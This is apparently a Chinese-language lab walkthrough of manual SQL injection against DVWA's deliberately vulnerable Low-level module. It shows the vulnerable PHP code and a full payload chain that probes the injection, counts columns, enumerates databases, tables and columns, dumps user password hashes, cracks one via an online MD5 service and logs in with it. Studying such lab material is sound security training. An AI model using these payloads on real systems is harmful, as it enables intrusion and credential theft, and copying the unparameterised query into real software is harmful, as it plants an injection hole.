### 一、测试需求分析

> **测试对象**：DVWA漏洞系统--SQL Injection模块--User ID提交功能
>  **防御等级**：Low
>  **测试目标**：判断被测模块是否存在SQL注入漏洞，漏洞是否可利用，若可以则检测出对应的数据库数据
>  **测试方式**：手工方式

url: http://localhost:8001/dvwa/vulnerabilities/sqli/



![img](https://upload-images.jianshu.io/upload_images/4866277-9377b33e3c025d2f.png?imageMogr2/auto-orient/strip|imageView2/2/w/564)

被测模块

防御等级为Low的后端控制代码：
 **low.php**

```php
<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        $html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    mysqli_close($GLOBALS["___mysqli_ston"]);
}

?>
```

以上代码所构造sql查询语句中的参数id，是从前端所提交到后端，代码中并没有对来自客户端提交的参数id进行合法性检查和过滤敏感字符等操作，很容易就能探测出SQL注入漏洞，然后进一步利用来获取数据库信息or其他操作权限。

当实际进行检测时，一开始并不知道后端的代码，需要进行类似于黑盒测试，构造一些特定的输入字符向服务端提交，根据响应返回的信息进行判断是否存在SQL注入漏洞。


#### 二、判断是否存在注入点，以及注入的类型

> **输入**：单引号 `'`   反斜杠`\`

**query**：（一开始并不知晓代码中设置的查询语句，可由后面步骤来推测）
 `SELECT first_name, last_name FROM users WHERE user_id = ''';`
 `SELECT first_name, last_name FROM users WHERE user_id = '\';`
 **输出**：语法错误，抛出异常信息，暴露了数据库服务器的类型为Mysql

- 对于Mysql，构造SQL注入攻击查询语句时常会用到的注释符有`#` 和 `--` （双横杠后面加空格联用）。
- Mysql安装后默认会创建三个数据库：information_schema、mysql和test。其中名为“mysql”的数据库很重要，它里面保存有MYSQL的系统信息、用户修改密码和新增用户，实际上就是针对该数据库中的有关数据表进行操作。



![img](https://upload-images.jianshu.io/upload_images/4866277-c88e301c58e19f98.png?imageMogr2/auto-orient/strip|imageView2/2/w/990)

单引号提交



![img](https://upload-images.jianshu.io/upload_images/4866277-da372624f2a87929.png?imageMogr2/auto-orient/strip|imageView2/2/w/471)

反斜杠提交

> **输入**：双引号 `"`

**query**：`SELECT first_name, last_name FROM users WHERE user_id = '"';`
 **输出**：语法无异常，但是无此id的数据可查询出来



![img](https://upload-images.jianshu.io/upload_images/4866277-b54d4207737a927b.png?imageMogr2/auto-orient/strip|imageView2/2/w/614)

> **输入**：`1`

**query**：`SELECT first_name, last_name FROM users WHERE user_id = '1';`
 **输出**：查询出对应的ID、First name、Surname 字段名及其值



![img](https://upload-images.jianshu.io/upload_images/4866277-daefe3b537714a95.png?imageMogr2/auto-orient/strip|imageView2/2/w/369)

> **输入**：
>  `1' or 1=1 #`
>  `1' or 1=1 --` (末尾为空格)
>  `1' or 'abc'='abc`

**query**：
 `SELECT first_name, last_name FROM users WHERE user_id = '1' or 1=1 #';`
 `SELECT first_name, last_name FROM users WHERE user_id = '1' or 1=1 -- ';`
 `SELECT first_name, last_name FROM users WHERE user_id = '1' or 'abc'='abc';`
 **输出**：构造的永真条件进行查询，列出了表中的所有的ID、First_name、Surname



![img](https://upload-images.jianshu.io/upload_images/4866277-a103110a9226c6ad.png?imageMogr2/auto-orient/strip|imageView2/2/w/598)

通过提交数字1,2,3,4,5,6...来判断用户表中的行数（rows）为5行



![img](https://upload-images.jianshu.io/upload_images/4866277-7d756d0262fefc2d.png?imageMogr2/auto-orient/strip|imageView2/2/w/592)

从以上可判断出url（http://localhost:8001/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#）中的参数id存在注入点，存在**字符型**的SQL注入漏洞


### 三、获取数据库信息

#### 1.猜解所查询的字段数目

方式1：**order by num**
 若num数值超过了字段数，则查询会报错，从而判断出select语句所查询字段的数目

> **输入**：
>  `1' order by 2 #`
>  `1' order by 3 #`

**输出**：



![img](https://upload-images.jianshu.io/upload_images/4866277-27fc41a95b42c138.png?imageMogr2/auto-orient/strip|imageView2/2/w/445)

以上，用`1' order by 2 #`进行提交，可正常查询出ID=1的2个字段值；用`1' order by 3 #`进行提交，则会出现异常提示。说明此处的select查询语句中查询的字段有2个

方式2：**union select 1,2,3...**
 若union select后的数字位（不一定是1/2/3，只要有数字占位即可）与实际查询的字段位不完全对应时，查询就会报错，直至调整到不报错时的占位个数，从而判断实际查询的字段数

> **输入**：
>  `1' union select 1 #`
>  `1' union select 1,2 #`
>  `1' union select 1,2,3 #`

**输出**：



![img](https://upload-images.jianshu.io/upload_images/4866277-2d5a2fc1d9aff9fa.png?imageMogr2/auto-orient/strip|imageView2/2/w/561)

以上，只有`1' union select 1,2 #`构造的语句才能正常匹配出字段值，相应的查询字段数=2

#### 2.获取字段显示位

在页面上会显示从select语句中选取的字段，通过以上方式2中的**union select 1,2,3...**可判断出具体显示字段的显示位
 **显示位的作用**：在知道显示位之后，就可以通过显示位来显示我们想知道的数据库信息，如数据库的版本，用户信息等...

> **输入**：`1' union select 1,2 #`

**输出**：



![img](https://upload-images.jianshu.io/upload_images/4866277-3ebaba44a0c6354e.png?imageMogr2/auto-orient/strip|imageView2/2/w/291)

显示位

#### 3.通过显示位获取数据库信息

此处会用到Mysql注入常用的一些函数，可参看此文==>[SQL注入常用的内置函数整理(以MySql为例)](https://www.jianshu.com/p/fcc5d8e69d68)

- 获取当前连接的数据库名称、DBMS的版本(Mysql的版本)
   `1' union select database(),version() #` 



![img](https://upload-images.jianshu.io/upload_images/4866277-f0cf0dac17956f80.png?imageMogr2/auto-orient/strip|imageView2/2/w/318)

当前连接的数据库=dvwa；Mysql版本=5.5.53

- 获取当前连接数据库的用户
   `1' union select user(),2 #` 



![img](https://upload-images.jianshu.io/upload_images/4866277-a3efcdc65dc935b6.png?imageMogr2/auto-orient/strip|imageView2/2/w/279)

当前连接数据库的用户为root，即超管权限用户

- 获取服务器的操作系统、数据库的存储目录
   `1' union select @@version_compile_os,@@datadir #` 



![img](https://upload-images.jianshu.io/upload_images/4866277-406ef4112df4cd7f.png?imageMogr2/auto-orient/strip|imageView2/2/w/468)

服务器的操作系统=Win32；数据库的存储目录为...\MySQL\data\

#### 4.获取数据库中的表名

- 获取DBMS中所有数据库的名称
   `1' union select 1,schema_name from information_schema.schemata #` 

Mysql安装后默认会创建三个数据库：information_schema、mysql和test；`information_schema`库下的`schemata`表中保存着DBMS中的所有数据库名称信息



![img](https://upload-images.jianshu.io/upload_images/4866277-7417a9c6958e21b8.png?imageMogr2/auto-orient/strip|imageView2/2/w/469)

- 获取当前连接数据库(dvwa)中的所有表
   `1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #` 



![img](https://upload-images.jianshu.io/upload_images/4866277-a7b0f3140f628e31.png?imageMogr2/auto-orient/strip|imageView2/2/w/735)

dvwa库中的所有表为：guestbook、users

#### 5.获取表中的列名（字段）

方式1：
 `1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #`



![img](https://upload-images.jianshu.io/upload_images/4866277-7b55fedb658b33d9.png?imageMogr2/auto-orient/strip|imageView2/2/w/712)

表字段：user_id,first_name,last_name,user,password,avatar,last_login,failed_login

方式2：
 1）**猜测字段数**：根据指定数据库-数据表，尝试猜测表中的字段个数，当 [猜测值=实际值] 时，页面会正常显示内容；当 [猜测值≠实际值] 时，页面会返回为空记录or语法错误的提示
 `1' having (select count(*) from information_schema.COLUMNS where table_schema='dvwa' and table_name='users')=[字段数] #`
 2）**猜测字段名**：当猜测的字段名与实际存在的字段名匹配时，则返回正常内容，否则会返回空记录or语法错误提示
 如：猜测登录的用户名字段[username/uname/user/u_name/user_name...]
 `1' exists(select [字段名] from users) #`

#### 6.导出数据库中的数据

获取users表中所有user和password数据，用符合'--'连接每一组中user和password，每一组"user--password"又分别用逗号隔开，集中在一起输出结果
 `1' union select 1,group_concat(concat_ws('--',user,password)) from users #`



![img](https://upload-images.jianshu.io/upload_images/4866277-7e8cc73628114941.png?imageMogr2/auto-orient/strip|imageView2/2/w/853)

or 每一组"user--password"数据信息换行输出
 `1' union select 1,concat_ws('--',user,password) from users #`




![img](https://upload-images.jianshu.io/upload_images/4866277-693791e952503e79.png?imageMogr2/auto-orient/strip|imageView2/2/w/485)



#### 7.验证导出数据的有效性

**1）解密**
 从以上第6步中获取的用户信息中，任意取一组"user--password"对应值"gordonb--e99a18c428cb38d5f260853678922e03"，密码是加密过的，当不知道具体加密方法的时候，可能需要尝试多种解密的方式去破解。
 比如可以先用常规的MD5解密检测一下是否能破解，解密传送门：http://www.cmd5.com/



![img](https://upload-images.jianshu.io/upload_images/4866277-686bcc517555cd2f.png?imageMogr2/auto-orient/strip|imageView2/2/w/531)

解密后：gordonb--abc123

**2）验证数据有效性**
 回到前端登录界面：http://localhost:8001/dvwa/login.php
 将以上解密出的用户信息填写到登录输入框中，提交校验



![img](https://upload-images.jianshu.io/upload_images/4866277-ce037a5c0155e52e.png?imageMogr2/auto-orient/strip|imageView2/2/w/424)

登录成功


